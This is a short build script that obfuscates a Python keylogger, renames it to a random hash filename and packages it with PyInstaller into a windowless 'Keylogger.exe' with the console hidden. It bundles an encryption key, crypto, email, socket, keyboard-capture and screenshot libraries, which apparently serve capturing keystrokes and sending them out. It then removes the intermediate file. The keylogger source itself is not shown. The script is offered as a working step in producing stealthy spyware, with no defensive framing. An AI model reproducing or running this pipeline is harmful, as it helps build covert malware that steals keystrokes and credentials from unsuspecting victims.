keylogger_file=262b94e627309e594705a428fd1bf025.py
output_exe=Keylogger.exe

python obfuscate.py keylogger.py
cp ./obfuscated_keylogger.py $keylogger_file
pyinstaller.exe $keylogger_file -F -w --hide-console hide-early --add-data "key.txt:." --add-data "util.py:."\
  --collect-submodules Crypto\
  --collect-submodules cryptography\
  --collect-submodules email.mime\
  --collect-submodules os\
  --collect-submodules platform\
  --collect-submodules smtplib\
  --collect-submodules socket\
  --collect-submodules threading\
  --collect-submodules PIL\
  --collect-submodules pynput\
  --collect-submodules requests\
  --collect-submodules datetime\
  --collect-submodules string\
  --collect-submodules random\
  --collect-submodules sys\
  --collect-submodules json\
  -n $output_exe
cp ./dist/$output_exe ./$output_exe
rm $keylogger_file